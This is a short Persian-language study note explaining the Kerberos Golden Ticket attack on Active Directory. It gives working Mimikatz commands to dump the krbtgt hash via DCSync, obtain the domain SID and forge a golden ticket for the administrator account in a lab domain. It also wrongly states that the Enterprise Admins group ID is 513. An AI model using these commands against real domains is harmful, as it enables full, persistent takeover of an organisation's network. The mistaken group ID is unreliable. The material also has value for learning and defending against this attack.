

## **Golden Ticket Attack چیه؟**

به زبان ساده:

> مهاجم **یه Ticket-Granting Ticket (TGT)** جعلی می‌سازه که از نظر دامین کاملاً معتبره و با اون می‌تونه به هر سرویس و منبعی توی دامین دسترسی پیدا کنه — حتی اگر پسورد ادمین‌ها عوض بشه.

این یعنی **یک دسترسی دائمی و کامل توی دامین.**


## **چرا اسمش Golden Ticket؟**

چون مثل **بلیط طلایی ویلی وانکا** هست:

- می‌تونه به هر جا که بخوای بری.
    
- محدودیت زمانی نداره (مگر دستی محدودش کنن).
    
- حتی بعد از عوض شدن پسورد کاربرها همچنان معتبر می‌مونه (تا وقتی که کلید Kerberos تغییر نکنه).




برای اینکه بتونیم هش مربوط به اکانت krbtgt رو بدیست بیاوریم باید از این دستور استفاده کنیم 

```
lsadump::dcsync /user:krbtgt /csv
```

و بعد از این دستور باید بیایم و SID مربوط به دامین رو بدست بیاوریم از طریق خوده Mimikaz با دستور 


```
net::trust
```


یا از طریق پاورشل

![[Pasted image 20250901012033.png]]


حالا نوبت به این میردس که ما هم هش krbtgt رو داریم و هم sid دامین رو داریم باید بیایم و حمله golden رو انجام بدهیم 


```
kerberos::golden /domain:charon.local /sid:S-1-5-21-3871112012-755809576-161639804 /krbtgt:fvjsotbgw4354e345wl3lvnweln345 /user:administrator /id:500 /ptt /ticket:charon_golden
```


```
/sids:512,513
```

با استفاده از این سوییح میتونیم بیایم و group sid رو بهش پاس بدیم 
مثلا enterprice admin sid میشه 513
